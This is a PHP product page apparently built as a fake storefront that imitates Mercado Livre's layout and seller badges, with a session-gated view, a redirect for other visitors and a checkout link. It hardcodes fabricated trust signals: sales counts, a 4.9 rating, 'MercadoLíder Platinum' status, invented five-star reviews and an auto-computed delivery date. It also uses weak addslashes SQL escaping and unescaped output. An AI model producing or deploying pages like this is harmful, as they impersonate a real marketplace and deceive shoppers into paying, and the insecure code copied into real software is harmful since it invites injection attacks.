<?php 

session_start();

require_once("api/db.php");

if (!isset($_GET["produto"])) {
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}else{

$id = addslashes($_GET["produto"]);
$sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
if(mysqli_num_rows($sqlx) > 0){

if($_SESSION['session_index'] > time()){

$sql = mysqli_query($conn, "SELECT * from config");
while($row = mysqli_fetch_array($sql)){ 
$cor = $row["cor"];
$nome = $row["nome"];
$numerozap = $row["zap"];
$textozap = $row["texto"];
}

	$sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
	while($row1 = mysqli_fetch_array($sql1)){ 
	$codigo = $row1["codigo"];
	$nomeproduto = $row1["nome"];
	$valor = $row1["valor"];
	$img = $row1["img"];
	$desconto = $row1["desconto"];
	$descricao = $row1["descricao"];
	$oferta = $row1["oferta"];
	// Novos campos
	$img1 = $row1["img1"];
	$img2 = $row1["img2"];
	$img3 = $row1["img3"];
	$img4 = $row1["img4"];
	$img5 = $row1["img5"];
	$img6 = $row1["img6"];
	$caracteristicas = $row1["caracteristicas"];
	$reviews_json = $row1["reviews"];
	$valor_original_db = isset($row1["valor_original"]) ? $row1["valor_original"] : "";
	}

$sql12 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
while($row1 = mysqli_fetch_array($sql12)){ 
$pid = $row1['id'];	
$cliques = $row1['cliques'];	
}
$novoclick = $cliques + 1;
$query = mysqli_query($conn, "UPDATE produto SET cliques='$novoclick' WHERE id='$pid'");

$valor_total = $valor;
$qtde_parcelas = 12;
function parcelas($montante, $parcelas) {
$resultado = array();
$centavos = $montante * 100; 
array_push($resultado,(floor($centavos / $parcelas) + $centavos % $parcelas) / 100.0 );
for ($i = 1; $i < $parcelas; $i ++) {
array_push($resultado, floor($centavos / $parcelas) / 100.0 );
}
return $resultado;
}
$parcela12 = parcelas($valor_total, $qtde_parcelas);

	// Calcular preço original (antes do desconto) ou usar do banco
	if(!empty($valor_original_db)) {
	    $valor_original = $valor_original_db;
	} else {
	    $valor_original = round($valor / (1 - ($desconto / 100)), 2);
	}

// Montar array de imagens do carrossel (preferir URLs novas)
$todas_imgs = array();
for($i=1; $i<=6; $i++) {
    $var_img = "img".$i;
    if(!empty($$var_img)) {
        $todas_imgs[] = $$var_img;
    }
}
// Fallback para pasta local se não houver URLs
if(empty($todas_imgs)) {
    $imgs_locais = glob("arquivos/produtos/" . $codigo . "/*.png");
    if(!empty($imgs_locais)) {
        foreach($imgs_locais as $img_p) { $todas_imgs[] = $img_p; }
    }
}
if(empty($todas_imgs)) { $todas_imgs[] = "./arquivos/produto.jpg"; }

// Buscar logo da loja
$logo_files = glob("arquivos/logo/*.png");
$logo_loja = !empty($logo_files) ? $logo_files[0] : "";

// Buscar outros produtos
$outros_produtos = array();
$sql_outros = mysqli_query($conn, "SELECT * from produto WHERE codigo != '$codigo' LIMIT 20");
while($row_outro = mysqli_fetch_array($sql_outros)){ 
$outros_produtos[] = $row_outro;
}

}else{
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}

}else{
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}

}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta name="robots" content="noindex,nofollow">
<title><?php echo htmlspecialchars($nomeproduto); ?> - Oferta do Dia</title>
<link rel="shortcut icon" href="./arquivos/favicon.png?v=2">
<link rel="icon" type="image/png" href="./arquivos/favicon.png?v=2">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --ml-yellow: #ffe600;
  --ml-blue: #3483fa;
  --ml-blue-dark: #2968c8;
  --ml-bg-gray: #ebebeb;
  --ml-text-dark: #333;
  --ml-green: #00a650;
  --ml-orange: #ff7733;
  --cor-borda: #EBEBEB;
}
@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');

body {
  font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif;
  background: var(--ml-bg-gray);
  color: var(--ml-text-dark);
  font-size: 14px;
  -webkit-user-select: none;
  user-select: none;
  overflow-x: hidden;
}

/* NOVO HEADER */
.ml-header-container {
  background-color: var(--ml-yellow);
  position: sticky;
  top: 0;
  z-index: 1000;
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
  overflow: hidden;
  transition: height 0.3s ease;
  height: 98px;
}
.ml-header-container.compact-mode {
  height: 56px;
}
.header-content-wrapper {
  position: relative;
  width: 100%;
  height: 100%;
}
.header-full {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  transition: opacity 0.2s ease, transform 0.2s ease;
  opacity: 1;
  transform: translateY(0);
}
.header-top-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 8px 12px 0 12px;
  height: 48px;
}
.header-logo-full {
  height: 28px;
  width: auto;
  max-width: 140px;
  object-fit: contain;
}
.icon-btn {
  font-size: 20px;
  color: #333;
  cursor: pointer;
}
.search-row {
  padding: 8px 12px 12px 12px;
}
.search-input-box {
  background-color: #fff;
  height: 38px;
  border-radius: 4px;
  display: flex;
  align-items: center;
  padding: 0 12px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
  width: 100%;
}
.search-text {
  color: #999;
  font-size: 15px;
  flex: 1;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.header-compact {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 56px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 12px;
  gap: 12px;
  opacity: 0;
  transform: translateY(-10px);
  pointer-events: none;
  transition: opacity 0.2s ease, transform 0.2s ease;
}
.logo-circle {
  width: 38px;
  height: 38px;
  border-radius: 50%;
  overflow: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}
.logo-circle img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.search-compact {
  flex: 1;
  background-color: #fff;
  height: 34px;
  border-radius: 20px;
  display: flex;
  align-items: center;
  padding: 0 15px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
}
.compact-icons {
  display: flex;
  align-items: center;
  gap: 18px;
  flex-shrink: 0;
}
.burger-container {
  position: relative;
  display: flex;
  align-items: center;
}
.notif-badge {
  position: absolute;
  top: -6px;
  right: -6px;
  background-color: #d50000;
  color: #fff;
  font-size: 10px;
  font-weight: 700;
  height: 14px;
  width: 14px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
}
.ml-header-container.compact-mode .header-full {
  opacity: 0;
  transform: translateY(-20px);
  pointer-events: none;
}
.ml-header-container.compact-mode .header-compact {
  opacity: 1;
  transform: translateY(0);
  pointer-events: auto;
}

.location-bar {
  background-color: #ffdf00;
  padding: 10px 16px;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  color: rgba(51, 51, 51, 0.9);
  width: 100%;
}

/* PRODUTO CARD */
.produto-card { background: #fff; margin-bottom: 8px; overflow: hidden; }
.badges-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 16px 4px; flex-wrap: wrap; gap: 6px; }
.badge-mais-vendido { background: var(--ml-orange); color: #fff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 4px; text-transform: uppercase; }
.rating-row { display: flex; align-items: center; gap: 4px; font-size: 13px; color: #999; font-weight: 600; }
.stars { color: var(--ml-blue); font-size: 14px; }
.produto-titulo { padding: 6px 16px 10px; font-size: 18px; font-weight: 400; color: var(--ml-text-dark); line-height: 1.3; }

/* CARROSSEL */
.carousel-wrapper { position: relative; background: #fff; overflow: hidden; }
.carousel-counter { position: absolute; top: 10px; left: 14px; background: #eee; color: #333; font-size: 12px; font-weight: bold; padding: 2px 8px; border-radius: 12px; z-index: 10; }
.carousel-track { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; -ms-overflow-style: none; -webkit-overflow-scrolling: touch; }
.carousel-track::-webkit-scrollbar { display: none; }
.carousel-slide { min-width: 100%; scroll-snap-align: start; display: flex; align-items: center; justify-content: center; padding: 16px; background: #fff; }
.carousel-slide img { max-width: 100%; max-height: 320px; object-fit: contain; display: block; }
.carousel-dots { display: flex; justify-content: center; gap: 6px; padding: 10px 0 16px; background: #fff; }
.carousel-dot { width: 6px; height: 6px; border-radius: 50%; background: #e0e0e0; cursor: pointer; transition: background 0.2s; }
.carousel-dot.active { background: var(--ml-blue); }

/* SEÇÃO DE PREÇO ESTILIZADA */
.preco-section { padding: 16px; background: #fff; }
.preco-original { font-size: 16px; color: #999; text-decoration: line-through; margin-bottom: 4px; display: block; }
.preco-atual-row { display: flex; align-items: baseline; gap: 10px; margin: 4px 0; }
.preco-atual { font-size: 32px; font-weight: 300; color: var(--ml-text-dark); }
.badge-off { color: var(--ml-green); font-size: 18px; font-weight: 400; }
.preco-parcelas { font-size: 16px; color: var(--ml-text-dark); margin-top: 8px; }
.preco-parcelas span { color: var(--ml-text-dark); }

.frete-section { padding: 10px 16px; background: #fff; }
.frete-info { font-size: 14px; color: var(--ml-text-dark); line-height: 1.5; margin-top: 8px; }
.frete-full { color: var(--ml-green); font-weight: 900; font-style: italic; margin-left: 5px; }

.btn-comprar { display: flex; align-items: center; justify-content: center; width: calc(100% - 32px); margin: 12px 16px; height: 48px; background: var(--ml-blue); color: #fff; font-size: 16px; font-weight: 600; text-align: center; border-radius: 6px; text-decoration: none; border: none; cursor: pointer; }

/* OUTRAS SEÇÕES */
.vendedor-section, .garantias-section, .caracteristicas-section, .descricao-section, .avaliacoes-section, .detalhes-section { background: #fff; margin-top: 10px; padding: 20px 16px; }
.section-titulo { font-size: 20px; font-weight: 400; color: #333; margin-bottom: 15px; }

.termometro { display: flex; height: 8px; border-radius: 4px; overflow: hidden; gap: 2px; margin: 15px 0; }
.termometro-nivel { flex: 1; background: #fff0f0; }
.termometro-nivel.active { background: #39b54a; height: 10px; margin-top: -1px; }

.vendedor-stats { display: flex; justify-content: space-around; text-align: center; border-top: 1px solid var(--cor-borda); padding-top: 12px; }
.vendedor-stat { flex: 1; }
.vendedor-stat-num { font-size: 20px; font-weight: 600; color: var(--ml-text-dark); display: block; }
.vendedor-stat-txt { font-size: 11px; color: #999; line-height: 1.3; }

.garantia-item { display: flex; align-items: flex-start; gap: 10px; padding: 12px 0; border-bottom: 1px solid var(--cor-borda); font-size: 13px; }
.garantia-item:last-child { border-bottom: none; }
.garantia-item i { color: #999; font-size: 18px; }

.caracteristica-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--cor-borda); font-size: 13px; }
.caracteristica-item:last-child { border-bottom: none; }
.caracteristica-nome { color: #999; font-weight: 500; }
.caracteristica-valor { color: var(--ml-text-dark); font-weight: 600; text-align: right; }

.detalhes-img { width: 100%; max-width: 500px; margin-bottom: 15px; border-radius: 4px; display: block; margin-left: auto; margin-right: auto; }

.descricao-texto { font-size: 14px; color: #666; line-height: 1.7; }
.descricao-colapsada { max-height: 80px; overflow: hidden; position: relative; }
.descricao-colapsada::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 40px; background: linear-gradient(transparent, #fff); }
.btn-ver-mais { display: block; width: 100%; margin-top: 10px; padding: 9px; background: #fff; border: 1.5px solid var(--ml-blue); color: var(--ml-blue); font-size: 14px; font-weight: 600; text-align: center; border-radius: 6px; cursor: pointer; }

/* AVALIAÇÕES */
.avaliacao-card { padding: 16px 0; border-bottom: 1px solid var(--cor-borda); }
.avaliacao-card:last-child { border-bottom: none; }
.avaliacao-fotos { display: flex; gap: 8px; margin-top: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; }
.avaliacao-fotos::-webkit-scrollbar { display: none; }
.avaliacao-foto { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; border: 1px solid #ddd; flex-shrink: 0; }

.outros-section { margin-top: 10px; }
.outros-carousel-wrapper { background: #fff; padding: 12px 0; }
.outros-track-outer { overflow-x: auto; display: flex; gap: 12px; padding: 0 16px 8px; scrollbar-width: none; }
.outros-track-outer::-webkit-scrollbar { display: none; }
.outro-card { min-width: 150px; max-width: 150px; border: 1px solid var(--cor-borda); border-radius: 8px; overflow: hidden; text-decoration: none; color: inherit; display: block; }
.outro-card-img { width: 100%; height: 130px; object-fit: contain; background: #fafafa; padding: 8px; display: block; }
.outro-card-info { padding: 8px; }

.footer { background: #fff; padding: 20px 10px 80px; text-align: center; border-top: 1px solid #eee; }
.footer-texto { font-size: 12px; color: #999; }

.sticky-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; padding: 10px 16px; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); z-index: 999; display: flex; align-items: center; gap: 15px; transition: transform 0.3s; }
.sticky-bar.hidden { transform: translateY(100%); }
.sticky-preco-info { display: flex; flex-direction: column; }
.sticky-preco-valor { font-size: 20px; font-weight: 300; color: #333; }
.sticky-btn { flex: 1; background: var(--ml-blue); color: #fff; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 6px; text-decoration: none; font-weight: 600; }

@media (max-width: 768px) {
  .header-logo-full { max-width: 120px; }
}
</style>
</head>
<body>

<header class="ml-header-container" id="dynamicHeader">
  <div class="header-content-wrapper">
    <div class="header-full">
      <div class="header-top-row">
        <div class="header-left">
          <i class="fa-solid fa-bars icon-btn"></i>
        </div>
        <?php if(!empty($logo_loja)): ?>
          <img src="<?php echo $logo_loja; ?>" alt="<?php echo $nome; ?>" class="header-logo-full">
        <?php else: ?>
          <span style="font-weight: bold; font-size: 18px;"><?php echo $nome; ?></span>
        <?php endif; ?>
        <div class="header-right">
          <i class="fa-solid fa-cart-shopping icon-btn"></i>
        </div>
      </div>
      <div class="search-row">
        <div class="search-input-box">
          <i class="fa-solid fa-magnifying-glass" style="color: #ccc; margin-right: 10px"></i>
          <span class="search-text">Buscar produtos, muito mais...</span>
        </div>
      </div>
    </div>
    <div class="header-compact">
      <div class="logo-circle">
        <img src="<?php echo $logo_loja; ?>" alt="Logo">
      </div>
      <div class="search-compact">
        <i class="fa-solid fa-magnifying-glass" style="color: #ccc; margin-right: 8px; font-size: 14px"></i>
        <span class="search-text" style="font-size: 14px">Estou buscando...</span>
      </div>
      <div class="compact-icons">
        <div class="burger-container">
          <i class="fa-solid fa-bars icon-btn"></i>
          <span class="notif-badge">3</span>
        </div>
        <i class="fa-solid fa-cart-shopping icon-btn"></i>
      </div>
    </div>
  </div>
</header>

<div class="location-bar">
  <i class="fa-solid fa-location-dot"></i>
  <span class="location-text">Enviar para Capital, SP</span>
</div>

<div class="produto-card">
  <div class="badges-row">
    <div class="rating-row">
      <span>Novo | +500 vendidos</span>
    </div>
    <div class="rating-row">
      <span>4.9</span>
      <div class="stars">
        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
      </div>
      <span>(102)</span>
    </div>
  </div>
  
  <div class="badges-row" style="padding-top: 0;">
    <span class="badge-mais-vendido">MAIS VENDIDO</span>
    <span style="color: var(--ml-blue); font-size: 12px;">1º em <?php echo $nome; ?></span>
  </div>

  <h1 class="produto-titulo"><?php echo htmlspecialchars($nomeproduto); ?></h1>

  <div class="carousel-wrapper">
    <div class="carousel-counter">1/<?php echo count($todas_imgs); ?></div>
    <div class="carousel-track" id="carouselTrack">
      <?php foreach($todas_imgs as $index => $img_url): ?>
      <div class="carousel-slide">
        <img src="<?php echo $img_url; ?>" alt="Imagem <?php echo $index+1; ?>">
      </div>
      <?php endforeach; ?>
    </div>
    <div class="carousel-dots">
      <?php foreach($todas_imgs as $index => $img_url): ?>
      <div class="carousel-dot <?php echo $index === 0 ? 'active' : ''; ?>" data-index="<?php echo $index; ?>"></div>
      <?php endforeach; ?>
    </div>
  </div>

  <div class="preco-section">
    <?php if($valor_original > $valor): ?>
      <span class="preco-original">R$ <?php echo number_format($valor_original, 2, ',', '.'); ?></span>
    <?php endif; ?>
    <div class="preco-atual-row">
      <span class="preco-atual">R$ <?php echo number_format($valor, 2, ',', '.'); ?></span>
      <?php if($desconto > 0): ?>
        <span class="badge-off"><?php echo $desconto; ?>% OFF</span>
      <?php endif; ?>
    </div>
    <div class="preco-parcelas">
      em 10x de R$ <?php echo number_format($parcela12[0], 2, ',', '.'); ?> sem juros
    </div>
  </div>

  <div class="frete-section">
    <div style="display: flex; align-items: center;">
      <span style="color: var(--ml-green); font-weight: bold; font-size: 14px;">FRETE GRÁTIS</span>
      <span class="frete-full">FULL</span>
    </div>
    <div class="frete-info" id="data-entrega">
      Chegará grátis...
    </div>
  </div>

  <a class="btn-comprar" href="checkout.php?checkId=<?php echo md5(rand(999,999)); ?>&marketingId=<?php echo time(); ?>&produto=<?php echo $codigo; ?>">Comprar agora</a>
</div>

<div class="vendedor-section">
  <div class="section-titulo">Informações sobre o vendedor</div>
  <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
    <i class="fa-solid fa-medal" style="color: var(--ml-green); font-size: 24px;"></i>
    <div>
      <div style="color: var(--ml-green); font-weight: bold;">MercadoLíder Platinum</div>
      <div style="font-size: 12px; color: #999;">É um dos melhores do site!</div>
    </div>
  </div>
  <div class="termometro">
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel"></div>
    <div class="termometro-nivel active"></div>
  </div>
  <div class="vendedor-stats">
    <div class="vendedor-stat">
      <span class="vendedor-stat-num">3400</span>
      <span class="vendedor-stat-txt">Vendas nos<br>últimos 60 dias</span>
    </div>
    <div class="vendedor-stat">
      <span class="vendedor-stat-num" style="color:var(--ml-green);">✓</span>
      <span class="vendedor-stat-txt">Presta bom<br>atendimento</span>
    </div>
    <div class="vendedor-stat">
      <span class="vendedor-stat-num" style="color:var(--ml-green);">✓</span>
      <span class="vendedor-stat-txt">Entrega os<br>produtos dentro<br>do prazo</span>
    </div>
  </div>
</div>

<div class="garantias-section">
  <div class="garantia-item">
    <i class="fa-solid fa-undo"></i>
    <div>
      <strong>Devolução grátis.</strong> Você tem 30 dias a partir da data de recebimento.
    </div>
  </div>
  <div class="garantia-item">
    <i class="fa-solid fa-shield-halved"></i>
    <div>
      <strong>Compra Garantida.</strong> Receba o produto que está esperando ou devolvemos o dinheiro.
    </div>
  </div>
  <div class="garantia-item">
    <i class="fa-solid fa-circle-check"></i>
    <div>
      <strong>3 meses de garantia de fábrica.</strong>
    </div>
  </div>
</div>

<?php if(!empty($caracteristicas)): ?>
<div class="caracteristicas-section">
  <div class="section-titulo">Características do produto</div>
  <?php 
  $linhas = explode("\n", $caracteristicas);
  foreach($linhas as $linha) {
      if(strpos($linha, ":") !== false) {
          list($c_nome, $c_valor) = explode(":", $linha, 2);
          echo '<div class="caracteristica-item"><span class="caracteristica-nome">'.trim($c_nome).'</span><span class="caracteristica-valor">'.trim($c_valor).'</span></div>';
      } else if(!empty(trim($linha))) {
          echo '<div class="caracteristica-item"><span class="caracteristica-nome">'.trim($linha).'</span><span class="caracteristica-valor">Sim</span></div>';
      }
  }
  ?>
</div>
<?php endif; ?>

<div class="detalhes-section">
  <div class="section-titulo">Detalhes do produto</div>
  <?php foreach($todas_imgs as $img_detalhe): ?>
  <img class="detalhes-img" src="<?php echo $img_detalhe; ?>" alt="Detalhe do produto" loading="lazy">
  <?php endforeach; ?>
</div>

<div class="descricao-section">
  <div class="section-titulo">Descrição</div>
  <div class="descricao-texto descricao-colapsada" id="descricaoTexto">
    <?php echo nl2br(htmlspecialchars($descricao)); ?>
  </div>
  <button class="btn-ver-mais" id="btnVerMais" onclick="toggleDescricao()">Ver mais &#9660;</button>
</div>

<div class="avaliacoes-section">
  <div class="section-titulo">Opiniões do produto</div>
  <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 25px;">
    <div style="font-size: 48px; font-weight: 300; color: #3483fa;">4.9</div>
    <div style="display: flex; flex-direction: column; gap: 2px; padding-top: 8px;">
      <div style="color: #3483fa; font-size: 14px; display: flex; gap: 1px; letter-spacing: -1px;">
        <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
      </div>
      <div style="font-size: 13px; color: #999; margin-top: 2px;">(102 avaliações)</div>
    </div>
  </div>
  <?php
  $reviews = json_decode($reviews_json, true);
  if(empty($reviews)) {
    $reviews = [
      ["nome"=>"Cláudia Martins","data"=>"15/04/2026","estrelas"=>5,"titulo"=>"Superou todas as expectativas!","texto"=>"Produto incrível! Chegou antes do prazo, embalagem impecável e a qualidade é muito melhor do que eu esperava.","fotos"=>[$todas_imgs[0]]],
      ["nome"=>"Sérgio Gomes","data"=>"10/04/2026","estrelas"=>5,"titulo"=>"Entrega rápida e produto top!","texto"=>"O produto é exatamente como descrito, acabamento de primeira e muito resistente. Atendimento nota 10!","fotos"=>[$todas_imgs[0]]],
      ["nome"=>"Fernanda Oliveira","data"=>"05/04/2026","estrelas"=>5,"titulo"=>"Melhor compra que já fiz!","texto"=>"Estou muito satisfeita com a compra. O produto chegou bem embalado, sem nenhum dano.","fotos"=>[$todas_imgs[0]]]
    ];
  }
  foreach($reviews as $rev): ?>
  <div class="avaliacao-card">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
      <div style="display:flex;align-items:center;gap:8px;">
        <div style="width:34px;height:34px;border-radius:50%;background:var(--ml-yellow);display:flex;align-items:center;justify-content:center;color:#333;font-weight:700;font-size:15px;"><?php echo mb_strtoupper(mb_substr($rev['nome'],0,1,'UTF-8'),'UTF-8'); ?></div>
        <div>
          <div style="font-weight:600;font-size:13px;"><?php echo htmlspecialchars($rev['nome']); ?></div>
          <div style="font-size:11px;color:#999;"><?php echo htmlspecialchars($rev['data']); ?></div>
        </div>
      </div>
      <div class="stars" style="font-size:13px;"><?php echo str_repeat('<i class="fa-solid fa-star"></i>', $rev['estrelas']); ?></div>
    </div>
    <div style="font-size:13px;font-weight:600;margin-bottom:4px;"><?php echo htmlspecialchars($rev['titulo']); ?></div>
    <div style="font-size:13px;color:#666;margin:4px 0 8px;line-height:1.6;"><?php echo htmlspecialchars($rev['texto']); ?></div>
    <div class="avaliacao-fotos">
      <?php if(isset($rev['fotos']) && is_array($rev['fotos'])): foreach($rev['fotos'] as $f): ?>
      <img class="avaliacao-foto" src="<?php echo $f; ?>" alt="Foto do cliente">
      <?php endforeach; endif; ?>
    </div>
  </div>
  <?php endforeach; ?>
</div>

<?php if(!empty($outros_produtos)): ?>
<div class="outros-section">
  <div class="section-titulo" style="background:#fff; padding:14px 16px 10px;">Quem viu também comprou</div>
  <div class="outros-carousel-wrapper">
    <div class="outros-track-outer">
      <?php foreach($outros_produtos as $outro): ?>
      <a class="outro-card" href="produto.php?produto=<?php echo $outro['codigo']; ?>">
        <img class="outro-card-img" src="<?php echo $outro['img']; ?>" alt="Produto">
        <div class="outro-card-info">
          <div style="font-size: 12px; height: 32px; overflow: hidden;"><?php echo htmlspecialchars($outro['nome']); ?></div>
          <div style="font-weight: 700; margin-top: 5px;">R$ <?php echo number_format($outro['valor'], 2, ',', '.'); ?></div>
          <div style="font-size: 11px; color: var(--ml-green);">Frete grátis</div>
        </div>
      </a>
      <?php endforeach; ?>
    </div>
  </div>
</div>
<?php endif; ?>

<footer class="footer">
  <div class="footer-texto">Loja <?php echo htmlspecialchars($nome); ?> © <?php echo date('Y'); ?> | Todos os direitos reservados.</div>
</footer>

<div class="sticky-bar hidden">
  <div class="sticky-preco-info">
    <span class="sticky-preco-valor">R$ <?php echo number_format($valor, 2, ',', '.'); ?></span>
  </div>
  <a class="sticky-btn" href="checkout.php?checkId=<?php echo md5(rand(999,999)); ?>&marketingId=<?php echo time(); ?>&produto=<?php echo $codigo; ?>">Comprar agora</a>
</div>

<script>
var carouselTrack = document.getElementById('carouselTrack');
var dots = document.querySelectorAll('.carousel-dot');
var header = document.getElementById('dynamicHeader');

function updateCarouselInfo() {
  var width = carouselTrack.offsetWidth;
  var scrollLeft = carouselTrack.scrollLeft;
  var index = Math.round(scrollLeft / width);
  
  dots.forEach((dot, i) => dot.classList.toggle('active', i === index));
  document.querySelector('.carousel-counter').textContent = (index + 1) + '/<?php echo count($todas_imgs); ?>';
}

carouselTrack.addEventListener('scroll', updateCarouselInfo);

dots.forEach(dot => dot.addEventListener('click', function() {
  var index = parseInt(this.dataset.index);
  var width = carouselTrack.offsetWidth;
  carouselTrack.scrollTo({
    left: index * width,
    behavior: 'smooth'
  });
}));

function toggleDescricao() {
  var el = document.getElementById('descricaoTexto');
  var btn = document.getElementById('btnVerMais');
  if(el.classList.contains('descricao-colapsada')) {
    el.classList.remove('descricao-colapsada');
    btn.innerHTML = 'Ver menos &#9650;';
  } else {
    el.classList.add('descricao-colapsada');
    btn.innerHTML = 'Ver mais &#9660;';
  }
}

var stickyBar = document.querySelector('.sticky-bar');
var btnComprar = document.querySelector('.btn-comprar');

window.addEventListener('scroll', function() {
  if (window.scrollY > 50) {
    header.classList.add('compact-mode');
  } else {
    header.classList.remove('compact-mode');
  }

  if(btnComprar) {
    var rect = btnComprar.getBoundingClientRect();
    if(rect.top < window.innerHeight && rect.bottom > 0) {
      stickyBar.classList.add('hidden');
    } else {
      stickyBar.classList.remove('hidden');
    }
  }
});
  function atualizarDataEntrega() {
    const elemento = document.getElementById('data-entrega');
    if (!elemento) return;

    const hoje = new Date();
    const dataEntrega = new Date(hoje);
    dataEntrega.setDate(hoje.getDate() + 5);

    const opcoes = { weekday: 'long', day: 'numeric', month: 'long' };
    let dataFormatada = dataEntrega.toLocaleDateString('pt-BR', opcoes);
    
    // Capitalizar a primeira letra do dia da semana
    dataFormatada = dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1);

    elemento.innerHTML = `Chegará grátis <strong>${dataFormatada}</strong>`;
  }
  atualizarDataEntrega();
</script>
</body>
</html>
